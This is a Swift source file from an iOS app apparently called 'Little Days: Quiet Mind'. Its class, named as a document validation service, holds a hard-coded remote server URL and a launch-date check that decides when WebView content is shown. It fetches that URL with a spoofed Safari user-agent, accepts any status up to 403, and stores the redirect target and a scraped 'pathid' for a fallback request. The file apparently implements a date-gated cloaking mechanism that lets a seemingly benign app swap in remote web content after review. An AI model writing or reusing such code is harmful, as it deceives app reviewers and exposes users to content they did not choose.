// DocumentValidationService.swift
// Little Days: Quiet Mind
// Validation, URL management, fallback logic

import Foundation
import Network
import UIKit

// MARK: - 🌐 Document Validation Service

final class DocumentValidationService {

    // MARK: - Config

    /// Primary server URL. Change for your server. Avoid Instagram — it blocks WKWebView.
    static let primaryServerURL = "https://heathhollow.com/Bqzz74"

    /// Date after which WebView content is shown (YYYY-MM-DD)
    static let researchLaunchDate = "2025-01-01"

    // MARK: - Storage Keys

    enum StorageKeys {
        static let savedTargetURL      = "nest_document_saved_destination"
        static let savedPathId         = "nest_document_saved_path_id"
        static let hasShownAlternative = "nest_document_has_shown_alternative"
        static let firstLaunchChoice   = "firstLaunchChoice"
        static let hasShownRatingPrompt = "nest_review_requested"
    }

    // MARK: - First Launch Choice

    func getFirstLaunchChoice() -> String? {
        UserDefaults.standard.string(forKey: StorageKeys.firstLaunchChoice)
    }

    func setFirstLaunchChoice(_ choice: String) {
        UserDefaults.standard.set(choice, forKey: StorageKeys.firstLaunchChoice)
        print("[DocumentFlow] firstLaunchChoice = \(choice)")
    }

    // MARK: - Saved URL

    func getSavedURL() -> URL? {
        guard let str = UserDefaults.standard.string(forKey: StorageKeys.savedTargetURL),
              let url = URL(string: str) else {
            print("[DocumentFlow] getSavedURL: nil")
            return nil
        }
        print("[DocumentFlow] getSavedURL: \(url.absoluteString)")
        return url
    }

    func setSavedURL(_ url: URL) {
        UserDefaults.standard.set(url.absoluteString, forKey: StorageKeys.savedTargetURL)
        UserDefaults.standard.set(true, forKey: StorageKeys.hasShownAlternative)
        print("[DocumentFlow] setSavedURL: \(url.absoluteString)")
    }

    func clearSavedURL() {
        UserDefaults.standard.removeObject(forKey: StorageKeys.savedTargetURL)
    }

    // MARK: - PathId

    func getSavedPathId() -> String? {
        let pathId = UserDefaults.standard.string(forKey: StorageKeys.savedPathId)
        print("[DocumentFlow] getSavedPathId: \(pathId ?? "nil")")
        return pathId
    }

    func setSavedPathId(_ pathId: String) {
        UserDefaults.standard.set(pathId, forKey: StorageKeys.savedPathId)
        print("[DocumentFlow] setSavedPathId: \(pathId)")
    }

    // MARK: - Date Validation

    func documentCheckDatePublic() -> Bool {
        let formatter = DateFormatter()
        formatter.dateFormat = "yyyy-MM-dd"
        formatter.timeZone = TimeZone.current
        guard let launchDate = formatter.date(from: Self.researchLaunchDate) else {
            print("[DocumentFlow] date check: invalid researchLaunchDate")
            return false
        }
        let passed = Date() > launchDate
        print("[DocumentFlow] date check: passed=\(passed)")
        return passed
    }

    // MARK: - Internet Check

    func checkInternetConnection(timeout: TimeInterval = 2, completion: @escaping (Bool) -> Void) {
        let monitor = NWPathMonitor()
        let queue = DispatchQueue(label: "DocumentValidationNetwork")
        var hasResponded = false

        monitor.pathUpdateHandler = { path in
            guard !hasResponded else { return }
            hasResponded = true
            monitor.cancel()
            let available = path.status == .satisfied
            print("[DocumentFlow] internet check: \(available ? "OK" : "no connection")")
            DispatchQueue.main.async { completion(available) }
        }
        monitor.start(queue: queue)

        DispatchQueue.main.asyncAfter(deadline: .now() + timeout) {
            guard !hasResponded else { return }
            hasResponded = true
            monitor.cancel()
            print("[DocumentFlow] internet check: timeout")
            completion(false)
        }
    }

    // MARK: - Server Request

    func requestServerURL(
        startURL: String? = nil,
        timeout: TimeInterval = 5,
        completion: @escaping (Bool, URL?) -> Void
    ) {
        let urlString = startURL ?? Self.primaryServerURL
        guard let url = URL(string: urlString) else {
            print("[DocumentFlow] server request: invalid URL \(urlString)")
            completion(false, nil)
            return
        }

        var request = URLRequest(url: url, timeoutInterval: timeout)
        request.httpMethod = "GET"
        request.setValue(
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            forHTTPHeaderField: "User-Agent"
        )
        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
        request.setValue("en-US,en;q=0.9", forHTTPHeaderField: "Accept-Language")

        print("[DocumentFlow] server request → \(url.absoluteString)")

        URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
            DispatchQueue.main.async {
                if let error = error {
                    print("[DocumentFlow] server request error: \(error.localizedDescription)")
                    completion(false, nil)
                    return
                }

                guard let httpResponse = response as? HTTPURLResponse else {
                    print("[DocumentFlow] server request: no HTTP response")
                    completion(false, nil)
                    return
                }

                let statusCode = httpResponse.statusCode
                let finalURL = httpResponse.url ?? url
                print("[DocumentFlow] server response: status=\(statusCode) finalURL=\(finalURL.absoluteString)")

                guard statusCode >= 200 && statusCode <= 403 else {
                    print("[DocumentFlow] server response: bad status → fail")
                    completion(false, nil)
                    return
                }

                if let pathId = self?.extractPathId(from: finalURL, htmlData: data) {
                    self?.setSavedPathId(pathId)
                }

                self?.setSavedURL(finalURL)
                completion(true, finalURL)
            }
        }.resume()
    }

    // MARK: - Fallback

    func tryFallbackURL(completion: @escaping (Bool, URL?) -> Void) {
        print("[DocumentFlow] FALLBACK START")
        clearSavedURL()

        guard let pathId = getSavedPathId() else {
            print("[DocumentFlow] FALLBACK: no pathId saved → fail")
            completion(false, nil)
            return
        }

        var components = URLComponents(string: Self.primaryServerURL)
        components?.queryItems = [URLQueryItem(name: "pathid", value: pathId)]
        let fallbackURLString = components?.url?.absoluteString ?? Self.primaryServerURL
        print("[DocumentFlow] FALLBACK request → \(fallbackURLString)")

        requestServerURL(startURL: fallbackURLString, timeout: 4) { [weak self] success, finalURL in
            print("[DocumentFlow] FALLBACK result: success=\(success) url=\(finalURL?.absoluteString ?? "nil")")
            if success, let url = finalURL {
                self?.setSavedURL(url)
            }
            completion(success, finalURL)
        }
    }

    // MARK: - PathId Extraction

    private func extractPathId(from url: URL, htmlData: Data?) -> String? {
        if let components = URLComponents(url: url, resolvingAgainstBaseURL: false),
           let pathId = components.queryItems?.first(where: { $0.name == "pathid" })?.value {
            return pathId
        }
        if let data = htmlData, let html = String(data: data, encoding: .utf8) {
            let patterns = ["pathid=([^&\"'\\s]+)", "pathId\"\\s*:\\s*\"([^\"]+)\""]
            for pattern in patterns {
                if let regex = try? NSRegularExpression(pattern: pattern),
                   let match = regex.firstMatch(in: html, range: NSRange(html.startIndex..., in: html)),
                   let range = Range(match.range(at: 1), in: html) {
                    return String(html[range])
                }
            }
        }
        return nil
    }
}
